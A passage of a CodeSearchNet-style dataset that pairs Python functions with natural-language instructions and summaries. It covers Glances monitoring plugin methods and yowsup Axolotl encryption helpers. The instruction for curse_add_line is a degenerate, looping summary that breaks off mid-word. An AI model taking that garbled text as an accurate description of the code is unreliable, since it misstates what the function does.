self.get_views(item=container['name'],\n                                                               key='cpu',\n                                                               option='decoration')))\n            # MEM\n            try:\n                msg = '{:>7}'.format(self.auto_unit(container['memory']['usage']))\n            except KeyError:\n                msg = '{:>7}'.format('_')\n            ret.append(self.curse_add_line(msg, self.get_views(item=container['name'],\n                                                               key='mem',\n                                                               option='decoration')))\n            try:\n                msg = '{:>7}'.format(self.auto_unit(container['memory']['limit']))\n            except KeyError:\n                msg = '{:>7}'.format('_')\n            ret.append(self.curse_add_line(msg))\n            # IO R/W\n            unit = 'B'\n            for r in ['ior', 'iow']:\n                try:\n                    value = self.auto_unit(int(container['io'][r] // container['io']['time_since_update'])) + unit\n                    msg = '{:>7}'.format(value)\n                except KeyError:\n                    msg = '{:>7}'.format('_')\n                ret.append(self.curse_add_line(msg))\n            # NET RX/TX\n            if args.byte:\n                # Bytes per second (for dummy)\n                to_bit = 1\n                unit = ''\n            else:\n                # Bits per second (for real network administrator | Default)\n                to_bit = 8\n                unit = 'b'\n            for r in ['rx', 'tx']:\n                try:\n                    value = self.auto_unit(int(container['network'][r] // container['network']['time_since_update'] * to_bit)) + unit\n                    msg = '{:>7}'.format(value)\n                except KeyError:\n                    msg = '{:>7}'.format('_')\n                ret.append(self.curse_add_line(msg))\n            # Command\n            if container['Command'] is not None:\n                msg = ' {}'.format(' '.join(container['Command']))\n            else:\n                msg = ' {}'.format('_')\n            ret.append(self.curse_add_line(msg, splittable=True))\n\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _msg_name(self, container, max_width):\n        name = container['name']\n        if len(name) > max_width:\n            name = '_' + name[-max_width + 1:]\n        else:\n            name = name[:max_width]\n        return ' {:{width}}'.format(name, width=max_width)", "response": "Build the container name."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef run(self):\n        for i in self._stats_stream:\n            self._stats = i\n            time.sleep(0.1)\n            if self.stopped():\n                break", "response": "Grab the stats.\n            Infinite loop should be stopped by calling the stop method."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef is_enable(self, plugin_name=None):\n        if not plugin_name:\n            plugin_name = self.plugin_name\n        try:\n            d = getattr(self.args, 'disable_' + plugin_name)\n        except AttributeError:\n            return True\n        else:\n            return d is False", "response": "Return true if plugin is enabled."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreturning the object d in a JSON format.", "response": "def _json_dumps(self, d):\n        \"\"\"Return the object 'd' in a JSON format.\n\n        Manage the issue #815 for Windows OS\n        \"\"\"\n        try:\n            return json.dumps(d)\n        except UnicodeDecodeError:\n            return json.dumps(d, ensure_ascii=False)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nresetting the stats history.", "response": "def reset_stats_history(self):\n        \"\"\"Reset the stats history (dict of GlancesAttribute).\"\"\"\n        if self.history_enable():\n            reset_list = [a['name'] for a in self.get_items_history_list()]\n            logger.debug(\"Reset history for plugin {} (items: {})\".format(self.plugin_name, reset_list))\n            self.stats_history.reset()"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef update_stats_history(self):\n        # If the plugin data is a dict, the dict's key should be used\n        if self.get_key() is None:\n            item_name = ''\n        else:\n            item_name = self.get_key()\n        # Build the history\n        if self.get_export() and self.history_enable():\n            for i in self.get_items_history_list():\n                if isinstance(self.get_export(), list):\n                    # Stats is a list of data\n                    # Iter throught it (for exemple, iter throught network\n                    # interface)\n                    for l in self.get_export():\n                        self.stats_history.add(\n                            nativestr(l[item_name]) + '_' + nativestr(i['name']),\n                            l[i['name']],\n                            description=i['description'],\n                            history_max_size=self._limits['history_size'])\n                else:\n                    # Stats is not a list\n                    # Add the item to the history directly\n                    self.stats_history.add(nativestr(i['name']),\n                                           self.get_export()[i['name']],\n                                           description=i['description'],\n                                           history_max_size=self._limits['history_size'])", "response": "Update the stats history."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn the history for the given item", "response": "def get_raw_history(self, item=None, nb=0):\n        \"\"\"Return the history (RAW format).\n\n        - the stats history (dict of list) if item is None\n        - the stats history for the given item (list) instead\n        - None if item did not exist in the history\n        \"\"\"\n        s = self.stats_history.get(nb=nb)\n        if item is None:\n            return s\n        else:\n            if item in s:\n                return s[item]\n            else:\n                return None"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreturn the history for the given item", "response": "def get_json_history(self, item=None, nb=0):\n        \"\"\"Return the history (JSON format).\n\n        - the stats history (dict of list) if item is None\n        - the stats history for the given item (list) instead\n        - None if item did not exist in the history\n        Limit to lasts nb items (all if nb=0)\n        \"\"\"\n        s = self.stats_history.get_json(nb=nb)\n        if item is None:\n            return s\n        else:\n            if item in s:\n                return s[item]\n            else:\n                return None"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_stats_history(self, item=None, nb=0):\n        s = self.get_json_history(nb=nb)\n\n        if item is None:\n            return self._json_dumps(s)\n\n        if isinstance(s, dict):\n            try:\n                return self._json_dumps({item: s[item]})\n            except KeyError as e:\n                logger.error(\"Cannot get item history {} ({})\".format(item, e))\n                return None\n        elif isinstance(s, list):\n            try:\n                # Source:\n                # http://stackoverflow.com/questions/4573875/python-get-index-of-dictionary-item-in-list\n                return self._json_dumps({item: map(itemgetter(item), s)})\n            except (KeyError, ValueError) as e:\n                logger.error(\"Cannot get item history {} ({})\".format(item, e))\n                return None\n        else:\n            return None", "response": "Return the stats history ( JSON format )."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_trend(self, item, nb=6):\n        raw_history = self.get_raw_history(item=item, nb=nb)\n        if raw_history is None or len(raw_history) < nb:\n            return None\n        last_nb = [v[1] for v in raw_history]\n        return last_nb[-1] - mean(last_nb[:-1])", "response": "Get the trend regarding to the last nb values."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ngets the stats sorted by an alias or key.", "response": "def sorted_stats(self):\n        \"\"\"Get the stats sorted by an alias (if present) or key.\"\"\"\n        key = self.get_key()\n        return sorted(self.stats, key=lambda stat: tuple(map(\n            lambda part: int(part) if part.isdigit() else part.lower(),\n            re.split(r\"(\\d+|\\D+)\", self.has_alias(stat[key]) or stat[key])\n        )))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nupdating stats using SNMP.", "response": "def get_stats_snmp(self, bulk=False, snmp_oid=None):\n        \"\"\"Update stats using SNMP.\n\n        If bulk=True, use a bulk request instead of a get request.\n        \"\"\"\n        snmp_oid = snmp_oid or {}\n\n        from glances.snmp import GlancesSNMPClient\n\n        # Init the SNMP request\n        clientsnmp = GlancesSNMPClient(host=self.args.client,\n                                       port=self.args.snmp_port,\n                                       version=self.args.snmp_version,\n                                       community=self.args.snmp_community)\n\n        # Process the SNMP request\n        ret = {}\n        if bulk:\n            # Bulk request\n            snmpresult = clientsnmp.getbulk_by_oid(0, 10, itervalues(*snmp_oid))\n\n            if len(snmp_oid) == 1:\n                # Bulk command for only one OID\n                # Note: key is the item indexed but the OID result\n                for item in snmpresult:\n                    if iterkeys(item)[0].startswith(itervalues(snmp_oid)[0]):\n                        ret[iterkeys(snmp_oid)[0] + iterkeys(item)\n                            [0].split(itervalues(snmp_oid)[0])[1]] = itervalues(item)[0]\n            else:\n                # Build the internal dict with the SNMP result\n                # Note: key is the first item in the snmp_oid\n                index = 1\n                for item in snmpresult:\n                    item_stats = {}\n                    item_key = None\n                    for key in iterkeys(snmp_oid):\n                        oid = snmp_oid[key] + '.' + str(index)\n                        if oid in item:\n                            if item_key is None:\n                                item_key = item[oid]\n                            else:\n                                item_stats[key] = item[oid]\n                    if item_stats:\n                        ret[item_key] = item_stats\n                    index += 1\n        else:\n            # Simple get request\n            snmpresult = clientsnmp.get_by_oid(itervalues(*snmp_oid))\n\n            # Build the internal dict with the SNMP result\n            for key in iterkeys(snmp_oid):\n                ret[key] = snmpresult[snmp_oid[key]]\n\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreturn the stats object for a specific item in JSON format.", "response": "def get_stats_item(self, item):\n        \"\"\"Return the stats object for a specific item in JSON format.\n\n        Stats should be a list of dict (processlist, network...)\n        \"\"\"\n        if isinstance(self.stats, dict):\n            try:\n                return self._json_dumps({item: self.stats[item]})\n            except KeyError as e:\n                logger.error(\"Cannot get item {} ({})\".format(item, e))\n                return None\n        elif isinstance(self.stats, list):\n            try:\n                # Source:\n                # http://stackoverflow.com/questions/4573875/python-get-index-of-dictionary-item-in-list\n                # But https://github.com/nicolargo/glances/issues/1401\n                return self._json_dumps({item: list(map(itemgetter(item), self.stats))})\n            except (KeyError, ValueError) as e:\n                logger.error(\"Cannot get item {} ({})\".format(item, e))\n                return None\n        else:\n            return None"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreturning the stats object for a specific item = value in JSON format.", "response": "def get_stats_value(self, item, value):\n        \"\"\"Return the stats object for a specific item=value in JSON format.\n\n        Stats should be a list of dict (processlist, network...)\n        \"\"\"\n        if not isinstance(self.stats, list):\n            return None\n        else:\n            if value.isdigit():\n                value = int(value)\n            try:\n                return self._json_dumps({value: [i for i in self.stats if i[item] == value]})\n            except (KeyError, ValueError) as e:\n                logger.error(\n                    \"Cannot get item({})=value({}) ({})\".format(item, value, e))\n                return None"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef update_views(self):\n        ret = {}\n\n        if (isinstance(self.get_raw(), list) and\n                self.get_raw() is not None and\n                self.get_key() is not None):\n            # Stats are stored in a list of dict (ex: NETWORK, FS...)\n            for i in self.get_raw():\n                ret[i[self.get_key()]] = {}\n                for key in listkeys(i):\n                    value = {'decoration': 'DEFAULT',\n                             'optional': False,\n                             'additional': False,\n                             'splittable': False}\n                    ret[i[self.get_key()]][key] = value\n        elif isinstance(self.get_raw(), dict) and self.get_raw() is not None:\n            # Stats are stored in a dict (ex: CPU, LOAD...)\n            for key in listkeys(self.get_raw()):\n                value = {'decoration': 'DEFAULT',\n                         'optional': False,\n                         'additional': False,\n                         'splittable': False}\n                ret[key] = value\n\n        self.views = ret\n\n        return self.views", "response": "Update the stats views."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns the views object.", "response": "def get_views(self, item=None, key=None, option=None):\n        \"\"\"Return the views object.\n\n        If key is None, return all the view for the current plugin\n        else if option is None return the view for the specific key (all option)\n        else return the view fo the specific key/option\n\n        Specify item if the stats are stored in a dict of dict (ex: NETWORK, FS...)\n        \"\"\"\n        if item is None:\n            item_views = self.views\n        else:\n            item_views = self.views[item]\n\n        if key is None:\n            return item_views\n        else:\n            if option is None:\n                return item_views[key]\n            else:\n                if option in item_views[key]:\n                    return item_views[key][option]\n                else:\n                    return 'DEFAULT'"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns the views in JSON format.", "response": "def get_json_views(self, item=None, key=None, option=None):\n        \"\"\"Return the views (in JSON).\"\"\"\n        return self._json_dumps(self.get_views(item, key, option))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nload limits from the configuration file if it exists.", "response": "def load_limits(self, config):\n        \"\"\"Load limits from the configuration file, if it exists.\"\"\"\n        # By default set the history length to 3 points per second during one day\n        self._limits['history_size'] = 28800\n\n        if not hasattr(config, 'has_section'):\n            return False\n\n        # Read the global section\n        if config.has_section('global'):\n            self._limits['history_size'] = config.get_float_value('global', 'history_size', default=28800)\n            logger.debug(\"Load configuration key: {} = {}\".format('history_size', self._limits['history_size']))\n\n        # Read the plugin specific section\n        if config.has_section(self.plugin_name):\n            for level, _ in config.items(self.plugin_name):\n                # Read limits\n                limit = '_'.join([self.plugin_name, level])\n                try:\n                    self._limits[limit] = config.get_float_value(self.plugin_name, level)\n                except ValueError:\n                    self._limits[limit] = config.get_value(self.plugin_name, level).split(\",\")\n                logger.debug(\"Load limit: {} = {}\".format(limit, self._limits[limit]))\n\n        return True"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns the stat name with an optional header", "response": "def get_stat_name(self, header=\"\"):\n        \"\"\"\"Return the stat name with an optional header\"\"\"\n        ret = self.plugin_name\n        if header != \"\":\n            ret += '_' + header\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns the alert status relative to a current value.", "response": "def get_alert(self,\n                  current=0,\n                  minimum=0,\n                  maximum=100,\n                  highlight_zero=True,\n                  is_max=False,\n                  header=\"\",\n                  action_key=None,\n                  log=False):\n        \"\"\"Return the alert status relative to a current value.\n\n        Use this function for minor stats.\n\n        If current < CAREFUL of max then alert = OK\n        If current > CAREFUL of max then alert = CAREFUL\n        If current > WARNING of max then alert = WARNING\n        If current > CRITICAL of max then alert = CRITICAL\n\n        If highlight=True than 0.0 is highlighted\n\n        If defined 'header' is added between the plugin name and the status.\n        Only useful for stats with several alert status.\n\n        If defined, 'action_key' define the key for the actions.\n        By default, the action_key is equal to the header.\n\n        If log=True than add log if necessary\n        elif log=False than do not log\n        elif log=None than apply the config given in the conf file\n        \"\"\"\n        # Manage 0 (0.0) value if highlight_zero is not True\n        if not highlight_zero and current == 0:\n            return 'DEFAULT'\n\n        # Compute the %\n        try:\n            value = (current * 100) / maximum\n        except ZeroDivisionError:\n            return 'DEFAULT'\n        except TypeError:\n            return 'DEFAULT'\n\n        # Build the stat_name\n        stat_name = self.get_stat_name(header=header)\n\n        # Manage limits\n        # If is_max is set then display the value in MAX\n        ret = 'MAX' if is_max else 'OK'\n        try:\n            if value >= self.get_limit('critical', stat_name=stat_name):\n                ret = 'CRITICAL'\n            elif value >= self.get_limit('warning', stat_name=stat_name):\n                ret = 'WARNING'\n            elif value >= self.get_limit('careful', stat_name=stat_name):\n                ret = 'CAREFUL'\n            elif current < minimum:\n                ret = 'CAREFUL'\n        except KeyError:\n            return 'DEFAULT'\n\n        # Manage log\n        log_str = \"\"\n        if self.get_limit_log(stat_name=stat_name, default_action=log):\n            # Add _LOG to the return string\n            # So stats will be highlited with a specific color\n            log_str = \"_LOG\"\n            # Add the log to the list\n            glances_events.add(ret, stat_name.upper(), value)\n\n        # Manage threshold\n        self.manage_threshold(stat_name, ret)\n\n        # Manage action\n        self.manage_action(stat_name, ret.lower(), header, action_key)\n\n        # Default is 'OK'\n        return ret + log_str"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nmanage the action for the current alert.", "response": "def manage_action(self,\n                      stat_name,\n                      trigger,\n                      header,\n                      action_key):\n        \"\"\"Manage the action for the current stat.\"\"\"\n        # Here is a command line for the current trigger ?\n        try:\n            command, repeat = self.get_limit_action(trigger, stat_name=stat_name)\n        except KeyError:\n            # Reset the trigger\n            self.actions.set(stat_name, trigger)\n        else:\n            # Define the action key for the stats dict\n            # If not define, then it sets to header\n            if action_key is None:\n                action_key = header\n\n            # A command line is available for the current alert\n            # 1) Build the {{mustache}} dictionnary\n            if isinstance(self.get_stats_action(), list):\n                # If the stats are stored in a list of dict (fs plugin for exemple)\n                # Return the dict for the current header\n                mustache_dict = {}\n                for item in self.get_stats_action():\n                    if item[self.get_key()] == action_key:\n                        mustache_dict = item\n                        break\n            else:\n                # Use the stats dict\n                mustache_dict = self.get_stats_action()\n            # 2) Run the action\n            self.actions.run(\n                stat_name, trigger,\n                command, repeat, mustache_dict=mustache_dict)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nget the alert log.", "response": "def get_alert_log(self,\n                      current=0,\n                      minimum=0,\n                      maximum=100,\n                      header=\"\",\n                      action_key=None):\n        \"\"\"Get the alert log.\"\"\"\n        return self.get_alert(current=current,\n                              minimum=minimum,\n                              maximum=maximum,\n                              header=header,\n                              action_key=action_key,\n                              log=True)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreturning the limit value for the alert.", "response": "def get_limit(self, criticity, stat_name=\"\"):\n        \"\"\"Return the limit value for the alert.\"\"\"\n        # Get the limit for stat + header\n        # Exemple: network_wlan0_rx_careful\n        try:\n            limit = self._limits[stat_name + '_' + criticity]\n        except KeyError:\n            # Try fallback to plugin default limit\n            # Exemple: network_careful\n            limit = self._limits[self.plugin_name + '_' + criticity]\n\n        # logger.debug(\"{} {} value is {}\".format(stat_name, criticity, limit))\n\n        # Return the limiter\n        return limit"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ngetting the action for the alert.", "response": "def get_limit_action(self, criticity, stat_name=\"\"):\n        \"\"\"Return the tuple (action, repeat) for the alert.\n\n        - action is a command line\n        - repeat is a bool\n        \"\"\"\n        # Get the action for stat + header\n        # Exemple: network_wlan0_rx_careful_action\n        # Action key available ?\n        ret = [(stat_name + '_' + criticity + '_action', False),\n               (stat_name + '_' + criticity + '_action_repeat', True),\n               (self.plugin_name + '_' + criticity + '_action', False),\n               (self.plugin_name + '_' + criticity + '_action_repeat', True)]\n        for r in ret:\n            if r[0] in self._limits:\n                return self._limits[r[0]], r[1]\n\n        # No key found, the raise an error\n        raise KeyError"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreturn the log tag for the alert.", "response": "def get_limit_log(self, stat_name, default_action=False):\n        \"\"\"Return the log tag for the alert.\"\"\"\n        # Get the log tag for stat + header\n        # Exemple: network_wlan0_rx_log\n        try:\n            log_tag = self._limits[stat_name + '_log']\n        except KeyError:\n            # Try fallback to plugin default log\n            # Exemple: network_log\n            try:\n                log_tag = self._limits[self.plugin_name + '_log']\n            except KeyError:\n                # By defaukt, log are disabled\n                return default_action\n\n        # Return the action list\n        return log_tag[0].lower() == 'true'"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns the configuration value for the current plugin.", "response": "def get_conf_value(self, value, header=\"\", plugin_name=None):\n        \"\"\"Return the configuration (header_) value for the current plugin.\n\n        ...or the one given by the plugin_name var.\n        \"\"\"\n        if plugin_name is None:\n            # If not default use the current plugin name\n            plugin_name = self.plugin_name\n\n        if header != \"\":\n            # Add the header\n            plugin_name = plugin_name + '_' + header\n\n        try:\n            return self._limits[plugin_name + '_' + value]\n        except KeyError:\n            return []"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns True if the value is in the hide configuration list.", "response": "def is_hide(self, value, header=\"\"):\n        \"\"\"Return True if the value is in the hide configuration list.\n\n        The hide configuration list is defined in the glances.conf file.\n        It is a comma separed list of regexp.\n        Example for diskio:\n        hide=sda2,sda5,loop.*\n        \"\"\"\n        # TODO: possible optimisation: create a re.compile list\n        return not all(j is None for j in [re.match(i, value.lower()) for i in self.get_conf_value('hide', header=header)])"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreturn the alias name for the relative header or None if nonexist.", "response": "def has_alias(self, header):\n        \"\"\"Return the alias name for the relative header or None if nonexist.\"\"\"\n        try:\n            # Force to lower case (issue #1126)\n            return self._limits[self.plugin_name + '_' + header.lower() + '_' + 'alias'][0]\n        except (KeyError, IndexError):\n            # logger.debug(\"No alias found for {}\".format(header))\n            return None"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_stats_display(self, args=None, max_width=None):\n        display_curse = False\n\n        if hasattr(self, 'display_curse'):\n            display_curse = self.display_curse\n        if hasattr(self, 'align'):\n            align_curse = self._align\n\n        if max_width is not None:\n            ret = {'display': display_curse,\n                   'msgdict': self.msg_curse(args, max_width=max_width),\n                   'align': align_curse}\n        else:\n            ret = {'display': display_curse,\n                   'msgdict': self.msg_curse(args),\n                   'align': align_curse}\n\n        return ret", "response": "Return a dict with all the information needed to display the stat."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreturning a dict with. curse_add_line Where. curse_add_line is a function that returns a dict with. curse_add_line where. curse_add_line is a function that returns a dict with. curse_add_line where. curse_add_line is a function that returns a dict with. curse_add_line where. curse_add_line is a function that returns a dict with. cur", "response": "def curse_add_line(self, msg, decoration=\"DEFAULT\",\n                       optional=False, additional=False,\n                       splittable=False):\n        \"\"\"Return a dict with.\n\n        Where:\n            msg: string\n            decoration:\n                DEFAULT: no decoration\n                UNDERLINE: underline\n                BOLD: bold\n                TITLE: for stat title\n                PROCESS: for process name\n                STATUS: for process status\n                NICE: for process niceness\n                CPU_TIME: for process cpu time\n                OK: Value is OK and non logged\n                OK_LOG: Value is OK and logged\n                CAREFUL: Value is CAREFUL and non logged\n                CAREFUL_LOG: Value is CAREFUL and logged\n                WARNING: Value is WARINING and non logged\n                WARNING_LOG: Value is WARINING and logged\n                CRITICAL: Value is CRITICAL and non logged\n                CRITICAL_LOG: Value is CRITICAL and logged\n            optional: True if the stat is optional (display only if space is available)\n            additional: True if the stat is additional (display only if space is available after optional)\n            spittable: Line can be splitted to fit on the screen (default is not)\n        \"\"\"\n        return {'msg': msg, 'decoration': decoration, 'optional': optional, 'additional': additional, 'splittable': splittable}"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nmake a nice human-readable string out of number. Number of decimal places increases as quantity approaches 1. CASE: 613421788 RESULT: 585M low_precision: 585M CASE: 5307033647 RESULT: 4.94G low_precision: 4.9G CASE: 44968414685 RESULT: 41.9G low_precision: 41.9G CASE: 838471403472 RESULT: 781G low_precision: 781G CASE: 9683209690677 RESULT: 8.81T low_precision: 8.8T CASE: 1073741824 RESULT: 1024M low_precision: 1024M CASE: 1181116006 RESULT: 1.10G low_precision: 1.1G :low_precision: returns less decimal places potentially (default is False) sacrificing precision for more readability. :min_symbol: Do not approache if number < min_symbol (default is K)", "response": "def auto_unit(self, number,\n                  low_precision=False,\n                  min_symbol='K'\n                  ):\n        \"\"\"Make a nice human-readable string out of number.\n\n        Number of decimal places increases as quantity approaches 1.\n        CASE: 613421788        RESULT:       585M low_precision:       585M\n        CASE: 5307033647       RESULT:      4.94G low_precision:       4.9G\n        CASE: 44968414685      RESULT:      41.9G low_precision:      41.9G\n        CASE: 838471403472     RESULT:       781G low_precision:       781G\n        CASE: 9683209690677    RESULT:      8.81T low_precision:       8.8T\n        CASE: 1073741824       RESULT:      1024M low_precision:      1024M\n        CASE: 1181116006       RESULT:      1.10G low_precision:       1.1G\n\n        :low_precision: returns less decimal places potentially (default is False)\n                        sacrificing precision for more readability.\n        :min_symbol: Do not approache if number < min_symbol (default is K)\n        \"\"\"\n        symbols = ('K', 'M', 'G', 'T', 'P', 'E', 'Z', 'Y')\n        if min_symbol in symbols:\n            symbols = symbols[symbols.index(min_symbol):]\n        prefix = {\n            'Y': 1208925819614629174706176,\n            'Z': 1180591620717411303424,\n            'E': 1152921504606846976,\n            'P': 1125899906842624,\n            'T': 1099511627776,\n            'G': 1073741824,\n            'M': 1048576,\n            'K': 1024\n        }\n\n        for symbol in reversed(symbols):\n            value = float(number) / prefix[symbol]\n            if value > 1:\n                decimal_precision = 0\n                if value < 10:\n                    decimal_precision = 2\n                elif value < 100:\n                    decimal_precision = 1\n                if low_precision:\n                    if symbol in 'MK':\n                        decimal_precision = 0\n                    else:\n                        decimal_precision = min(1, decimal_precision)\n                elif symbol in 'K':\n                    decimal_precision = 0\n                return '{:.{decimal}f}{symbol}'.format(\n                    value, decimal=decimal_precision, symbol=symbol)\n        return '{!s}'.format(number)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn the trend message.", "response": "def trend_msg(self, trend, significant=1):\n        \"\"\"Return the trend message.\n\n        Do not take into account if trend < significant\n        \"\"\"\n        ret = '-'\n        if trend is None:\n            ret = ' '\n        elif trend > significant:\n            ret = '/'\n        elif trend < -significant:\n            ret = '\\\\'\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nchecking if the plugin is enabled.", "response": "def _check_decorator(fct):\n        \"\"\"Check if the plugin is enabled.\"\"\"\n        def wrapper(self, *args, **kw):\n            if self.is_enable():\n                ret = fct(self, *args, **kw)\n            else:\n                ret = self.stats\n            return ret\n        return wrapper"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _log_result_decorator(fct):\n        def wrapper(*args, **kw):\n            ret = fct(*args, **kw)\n            logger.debug(\"%s %s %s return %s\" % (\n                args[0].__class__.__name__,\n                args[0].__class__.__module__[len('glances_'):],\n                fct.__name__, ret))\n            return ret\n        return wrapper", "response": "Log the result of the function fct."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nupdating the HDD stats using the input method.", "response": "def update(self):\n        \"\"\"Update HDD stats using the input method.\"\"\"\n        # Init new stats\n        stats = self.get_init_value()\n\n        if self.input_method == 'local':\n            # Update stats using the standard system lib\n            stats = self.glancesgrabhddtemp.get()\n\n        else:\n            # Update stats using SNMP\n            # Not available for the moment\n            pass\n\n        # Update the stats\n        self.stats = stats\n\n        return self.stats"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nfetch the data from the HDDtemp daemon.", "response": "def fetch(self):\n        \"\"\"Fetch the data from hddtemp daemon.\"\"\"\n        # Taking care of sudden deaths/stops of hddtemp daemon\n        try:\n            sck = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sck.connect((self.host, self.port))\n            data = b''\n            while True:\n                received = sck.recv(4096)\n                if not received:\n                    break\n                data += received\n        except Exception as e:\n            logger.debug(\"Cannot connect to an HDDtemp server ({}:{} => {})\".format(self.host, self.port, e))\n            logger.debug(\"Disable the HDDtemp module. Use the --disable-hddtemp to hide the previous message.\")\n            if self.args is not None:\n                self.args.disable_hddtemp = True\n            data = \"\"\n        finally:\n            sck.close()\n            if data != \"\":\n                logger.debug(\"Received data from the HDDtemp server: {}\".format(data))\n\n        return data"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef set_prekeys_as_sent(self, prekeyIds):\n        logger.debug(\"set_prekeys_as_sent(prekeyIds=[%d prekeyIds])\" % len(prekeyIds))\n        self._store.preKeyStore.setAsSent([prekey.getId() for prekey in prekeyIds])", "response": "Sets the prekeys as sent to the store."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nencrypts the message with the recipient_id", "response": "def encrypt(self, recipient_id, message):\n        logger.debug(\"encrypt(recipientid=%s, message=%s)\" % (recipient_id, message))\n        \"\"\"\n        :param recipient_id:\n        :type recipient_id: str\n        :param data:\n        :type data: bytes\n        :return:\n        :rtype:\n        \"\"\"\n        cipher = self._get_session_cipher(recipient_id)\n        return cipher.encrypt(message + self._generate_random_padding())"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nencrypting a message with a group", "response": "def group_encrypt(self, groupid, message):\n        \"\"\"\n        :param groupid:\n        :type groupid: str\n        :param message:\n        :type message: bytes\n        :return:\n        :rtype:\n        \"\"\"\n        logger.debug(\"group_encrypt(groupid=%s, message=%s)\" % (groupid, message))\n        group_cipher = self._get_group_cipher(groupid, self._username)\n        return group_cipher.encrypt(message + self._generate_random_padding())"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef group_create_session(self, groupid, participantid, skmsgdata):\n        logger.debug(\"group_create_session(groupid=%s, participantid=%s, skmsgdata=[omitted])\"\n                     % (groupid, participantid))\n        senderKeyName = SenderKeyName(groupid, AxolotlAddress(participantid, 0))\n        senderkeydistributionmessage = SenderKeyDistributionMessage(serialized=skmsgdata)\n        self._group_session_builder.process(senderKeyName, senderkeydistributionmessage)", "response": "Process a new group session."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ncreates a new session for the user.", "response": "def create_session(self, username, prekeybundle, autotrust=False):\n        \"\"\"\n        :param username:\n        :type username: str\n        :param prekeybundle:\n        :type prekeybundle: PreKeyBundle\n        :return:\n        :rtype:\n        \"\"\"\n        logger.debug(\"create_session(username=%s, prekeybunder=[omitted], autotrust=%s)\" % (username, autotrust))\n        session_builder = SessionBuilder(self._store, self._store, self._store, self._store, username, 1)\n        try:\n            session_builder.processPreKeyBundle(prekeybundle)\n        except UntrustedIdentityException as ex:\n            if autotrust:\n                self.trust_identity(ex.getName(), ex.getIdentityKey())\n            else:\n                raise exceptions.UntrustedIdentityException(ex.getName(), ex.getIdentityKey())"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nchecks if a session exists in the cache.", "response": "def session_exists(self, username):\n        \"\"\"\n        :param username:\n        :type username: str\n        :return:\n        :rtype:\n        \"\"\"\n        logger.debug(\"session_exists(%s)?\" % username)\n        return self._store.containsSession(username, 1)"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ntransforms the data dictionary into a dictionary with the keys in the transform_map.", "response": "def transform(self, data):\n        \"\"\"\n        :param data:\n        :type data: dict\n        :return:\n        :rtype: dict\n        \"\"\"\n        out = {}\n        for key, val in data.items():\n            if key in self._transform_map:\n                target = self._transform_map[key]\n                key, val = target(key, val) if type(target) == types.FunctionType else (key, target)\n\n            out[key] = val\n\n\n        return out"}
